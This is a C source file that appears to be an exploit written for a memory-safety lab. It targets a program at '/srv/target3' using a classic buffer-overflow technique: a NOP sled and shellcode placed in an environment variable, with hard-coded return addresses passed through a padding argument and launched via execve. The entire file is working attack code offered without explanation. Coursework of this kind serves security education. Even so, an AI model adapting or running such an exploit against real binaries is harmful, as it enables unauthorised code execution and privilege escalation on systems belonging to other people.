#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

const char* target = "/srv/target3";
const int envSize = 400;
const uint32_t baseAddr = 0xffffdec0;
const int nopSize = 201;
const char nopChar = 0x90;
const int retOffset = 4;

const uint32_t startAddr = baseAddr + retOffset;
const uint32_t secondAddr = baseAddr + 2 * retOffset;
const char padding[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff";

void prepEnv(char *e) {
    memset(e, nopChar, envSize - 1);
    *((uint32_t *)(e)) = startAddr;
    *((uint32_t *)(e + retOffset)) = secondAddr;
    memcpy(e + nopSize, shellcode, sizeof(shellcode));
    e[envSize - 1] = '\0';
}

int main(void) {
    char *args[] = {target, padding, NULL};
    char env[envSize];

    prepEnv(env);

    char *envp[] = {env};

    execve(target, args, envp);
    fprintf(stderr, "execve failed.\n");

    return 0;
}